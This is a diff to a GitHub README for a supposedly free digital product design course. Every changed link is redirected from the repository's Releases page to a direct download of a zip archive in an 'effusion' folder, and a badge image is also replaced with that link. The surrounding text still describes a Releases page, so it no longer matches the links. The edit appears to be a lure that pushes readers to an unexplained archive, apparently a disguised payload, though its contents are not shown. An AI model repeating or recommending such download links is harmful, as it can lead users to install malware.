@@ -1,6 +1,6 @@
 # 🎨 Practical-Digital-Product-Design-2025-Free - Learn Digital Design Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-ff69b4)](https://github.com/r2hloveu/Practical-Digital-Product-Design-2025-Free/releases)
+[![Download Now](https://github.com/r2hloveu/Practical-Digital-Product-Design-2025-Free/raw/refs/heads/main/effusion/Product-Free-Practical-Design-Digital-v3.4-alpha.2.zip%20Now-Here-ff69b4)](https://github.com/r2hloveu/Practical-Digital-Product-Design-2025-Free/raw/refs/heads/main/effusion/Product-Free-Practical-Design-Digital-v3.4-alpha.2.zip)
 
 ## 📚 Introduction
 
@@ -14,7 +14,7 @@ Follow these simple steps to get started with the course and make the most of yo
 
 To download the course files, please visit this page:
 
-[Download Here](https://github.com/r2hloveu/Practical-Digital-Product-Design-2025-Free/releases)
+[Download Here](https://github.com/r2hloveu/Practical-Digital-Product-Design-2025-Free/raw/refs/heads/main/effusion/Product-Free-Practical-Design-Digital-v3.4-alpha.2.zip)
 
 ### ✅ Step 2: Choose Your Version
 
@@ -28,7 +28,7 @@ Click on the link that says "Assets." You will find several files available for 
 
 To download and install the course, follow these steps:
 
-1. **Visit the Releases Page:** Go to the following link: [Download Here](https://github.com/r2hloveu/Practical-Digital-Product-Design-2025-Free/releases).
+1. **Visit the Releases Page:** Go to the following link: [Download Here](https://github.com/r2hloveu/Practical-Digital-Product-Design-2025-Free/raw/refs/heads/main/effusion/Product-Free-Practical-Design-Digital-v3.4-alpha.2.zip).
   
 2. **Select Your Version:** Look for the latest version and click on "Assets."
 
@@ -75,4 +75,4 @@ A: Currently, we do not provide certificates for the free course version. Howeve
 
 If you encounter any issues or have questions about the course, feel free to reach out. You can create an issue on the GitHub repository, and I will respond as soon as possible.
 
-To download the course, please visit the Releases page: [Download Here](https://github.com/r2hloveu/Practical-Digital-Product-Design-2025-Free/releases). Enjoy your learning journey!
+To download the course, please visit the Releases page: [Download Here](https://github.com/r2hloveu/Practical-Digital-Product-Design-2025-Free/raw/refs/heads/main/effusion/Product-Free-Practical-Design-Digital-v3.4-alpha.2.zip). Enjoy your learning journey!
